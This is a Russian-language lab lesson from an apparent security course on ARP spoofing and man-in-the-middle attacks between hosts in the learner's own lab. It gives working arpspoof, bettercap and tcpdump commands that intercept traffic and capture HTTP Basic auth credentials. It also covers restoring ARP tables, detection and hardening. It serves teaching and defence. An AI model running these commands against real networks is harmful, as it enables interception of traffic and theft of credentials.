# 7.1 — ARP spoofing и MITM

> **M07 · Этап 1 · 4 ч · 🟡 · артефакт:** `labs/m07-network-attacks/l01-arp/`

## Цель

Встать в разрыв между двумя хостами своей лаборатории, увидеть их трафик и понять, почему ARP-атака работает без всяких уязвимостей в софте.

## Результат

- MITM между WS01 и DC01 (или LNX01 и шлюзом) через ARP spoof.
- Перехваченный HTTP-логин или другой открытый трафик.
- Чистое восстановление ARP-таблиц после лабы.

## Теория

- ARP не имеет аутентификации: кто ответил последним, тот и «прав».
- Attacker отправляет жертве: «10.10.10.10 — это мой MAC», а шлюзу: «10.10.10.20 — это мой MAC».
- Включаем `ip_forward=1`, чтобы трафик шёл дальше и жертва не заметила обрыв.
- Без forwarding получается DoS, а не MITM.
- HTTPS не даёт прочитать содержимое, но метаданные (SNI, IP, объём) остаются.
- Восстановление: `ip neigh flush`, или подождать, или послать корректные ARP.

## Лаборатория

### 0. Подготовка

```bash
ip -brief addr          # убедиться, что вы в 10.10.10.0/24
sudo sysctl -w net.ipv4.ip_forward=1
sysctl net.ipv4.ip_forward
```

Ожидаемо: `net.ipv4.ip_forward = 1`.

### 1. Посмотреть текущие ARP

На attacker:

```bash
ip neigh show 10.10.10.20
ip neigh show 10.10.10.10
```

На WS01:

```powershell
arp -a
```

Ожидаемо: MAC DC01 и WS01 — реальные (VMware `00:0c:29:...`).

### 2. Запустить spoof

Вариант `arpspoof` (два терминала):

```bash
sudo arpspoof -i eth0 -t 10.10.10.20 10.10.10.10
sudo arpspoof -i eth0 -t 10.10.10.10 10.10.10.20
```

Вариант `bettercap`:

```bash
sudo bettercap -iface eth0
```
```
> set arp.spoof.targets 10.10.10.20
> set arp.spoof.fullduplex true
> arp.spoof on
> net.sniff on
```

Ожидаемо: bettercap показывает ARP-пакеты и перехваченный трафик.

### 3. Проверить MITM

На WS01:

```powershell
arp -a
```

Ожидаемо: MAC для `10.10.10.10` теперь равен MAC attacker. Связь с DC не пропала (forwarding работает).

### 4. Перехватить креды

На LNX01 поднимите тестовый HTTP-логин (или используйте DVWA):

```bash
python3 -m http.server 8000
```

С WS01:

```powershell
curl.exe -u alice:Secret123 http://10.10.10.30:8000/
```

На attacker:

```bash
sudo tcpdump -i eth0 -A -n 'tcp port 8000' | grep -i authorization
```

Ожидаемо: `Authorization: Basic YWxpY2U6U2VjcmV0MTIz`. Декодируйте (`base64 -d`) — пароль в открытом виде.

### 5. Восстановление

Остановите `arpspoof`/`bettercap` (Ctrl+C). На WS01 и DC:

```powershell
arp -d *
```

Проверьте `arp -a`: MAC вернулся. Если нет — подождите 1–2 минуты.

## Атака и защита

- **Атака:** MITM для кражи кредов, сессии, DNS-спуфинга, инъекции.
- **Детект:** смена MAC шлюза, `arpwatch`, DAI на коммутаторе, аномалии в Zeek (`arp`).
- **Фикс:** DAI + DHCP snooping, статические ARP на критичных хостах, сегментация, 802.1X, TLS.

## Самопроверка

- [ ] Почему без `ip_forward` получается DoS?
- [ ] Почему HTTPS не спасает от факта MITM?
- [ ] Как DAI определяет легитимную пару IP-MAC?
- [ ] Что вы сделаете, если после лабы пропал интернет у жертвы?

## Дальше

[7.2 — LLMNR/NBT-NS/mDNS poisoning](l02-name-resolution-poisoning.md)
